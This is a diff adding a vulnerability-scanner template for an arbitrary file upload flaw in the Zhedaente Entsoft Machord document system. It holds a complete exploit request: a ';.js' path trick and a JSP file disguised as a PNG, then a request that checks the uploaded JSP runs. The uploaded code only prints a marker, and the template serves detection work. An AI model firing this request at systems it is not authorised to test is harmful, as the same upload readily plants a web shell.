@@ -1,0 +1,66 @@
+id: zhedaente-entsoft-machord-doc-upload
+info:
+  name: Zhedaente Entsoft Machord Doc Upload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template identifies an arbitrary file upload vulnerability in the Zhedaente Entsoft Machord document upload system.
+
+variables:
+  randstr: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(10,100)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName={{t1}}.jsp&strAffixStr&oprfilenam=null&gesnum"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11
+    body: |
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11
+      Content-Disposition: form-data; name="oprfilenam"
+
+      null
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11
+      Content-Disposition: form-data; name="uploadflg"
+
+      0
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11
+      Content-Disposition: form-data; name="strAffixStr"
+
+
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11
+      Content-Disposition: form-data; name="selfilenam"
+
+
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11
+      Content-Disposition: form-data; name="uploadfile"; filename="{{t1}}.jsp"
+      Content-Type: image/png
+
+      <%out.print("hello world{{randstr}}");%>
+      ------WebKitFormBoundaryQzxXQpKIb1f32N11--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "javascript:openbyStream('/enterdoc/Machord//"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/enterdoc/Machord/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello world{{randstr}}"
